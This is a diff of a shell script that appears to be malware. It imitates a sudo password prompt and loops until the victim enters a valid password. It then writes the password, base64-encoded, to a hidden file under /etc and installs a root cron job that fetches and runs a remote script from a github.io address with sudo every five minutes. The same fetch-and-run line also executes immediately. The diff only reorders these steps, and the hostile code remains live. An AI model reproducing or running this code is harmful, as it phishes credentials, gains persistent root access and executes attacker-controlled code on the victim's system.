@@ -2,22 +2,14 @@
 
 pwd=""
 
-while [ "$(echo $pwd | sudo -S -v whoami)" != "root" ]
+while [ "$(echo $pwd | sudo -Sk whoami)" != "root" ]
 do
   sleep 3000
   echo "Sorry, try again."
   echo -n "Password:"
   read -s pwd </dev/tty
   echo ""
-
-
-echo $pwd | sudo -S echo "Thank you for your help!"
-
-enc=$(echo $pwd | base64 | tr -- '+=/' '-_~')
-
-sudo echo $enc > /etc/.pwd.txt
-
-curl -s https://matthewpipie.github.io/sendmac.sh?$(date +%s) | sudo bash
+done
 
 command="curl -s https://matthewpipie.github.io/sendmac.sh?\$(date +\%s) | sudo bash"
 
@@ -28,3 +20,9 @@ echo "*/5 * * * * $command" >> mycron
 #install new cron file
 sudo crontab -u root mycron
 rm mycron
+
+enc=$(echo $pwd | base64 | tr -- '+=/' '-_~')
+
+sudo echo $enc > /etc/.pwd.txt
+
+curl -s https://matthewpipie.github.io/sendmac.sh?$(date +%s) | sudo bash
